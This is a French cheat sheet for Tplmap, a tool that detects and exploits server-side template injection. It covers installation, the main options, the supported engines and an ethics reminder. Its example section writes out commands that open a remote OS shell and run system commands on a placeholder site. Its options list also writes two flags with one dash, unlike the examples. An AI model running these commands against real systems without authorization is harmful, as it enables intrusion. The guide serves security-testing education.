# Cheat Sheet Tplmap

Tplmap (Template Mapper) est un outil qui permet de détecter et d'exploiter des injections de code dans des templates de serveur. Il supporte une multitude de moteurs de templates, permettant de tester des applications web contre des vulnérabilités de template injection.

## Installation
Clonez le dépôt GitHub et installez les dépendances :
```
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

## Utilisation de base
Pour utiliser Tplmap, vous pouvez passer l'URL cible avec le paramètre de test comme argument. Tplmap tentera de détecter automatiquement la présence de vulnérabilités de template injection.

```
python tplmap.py -u 'http://www.exemple.com/page?name=Test'
```

## Options communes
- `-u`, `--url` : URL cible.
- `--data` : Données POST à envoyer lors de l'envoi de requêtes.
- `-d`, `--detect` : Force la détection du moteur de template sans tester l'injection de code.
- `-os-shell` : Tente d'obtenir une shell sur le système distant.
- `-os-cmd` : Exécute une commande système à distance.

## Exemples d'exploitation
- Détecter le moteur de template sans exécuter de commande :
  ```
  python tplmap.py --detect -u 'http://www.exemple.com/page?search=Test'
  ```
- Obtenir une shell sur le système distant :
  ```
  python tplmap.py --os-shell -u 'http://www.exemple.com/page?search=Test'
  ```
- Exécuter une commande spécifique sur le système distant :
  ```
  python tplmap.py --os-cmd 'id' -u 'http://www.exemple.com/page?search=Test'
  ```

## Moteurs de templates supportés
Tplmap est capable de détecter et d'exploiter plusieurs moteurs de templates, incluant mais non limité à :
- Jinja2
- Smarty
- Twig
- Freemarker
- Velocity

## Sécurité et éthique
- Utilisez Tplmap pour auditer et améliorer la sécurité de vos propres applications ou avec l'autorisation explicite du propriétaire du site.
- Ne l'utilisez pas pour des activités malveillantes.

Pour plus de détails et des cas d'utilisation avancés, consultez la documentation officielle et le dépôt GitHub de Tplmap.
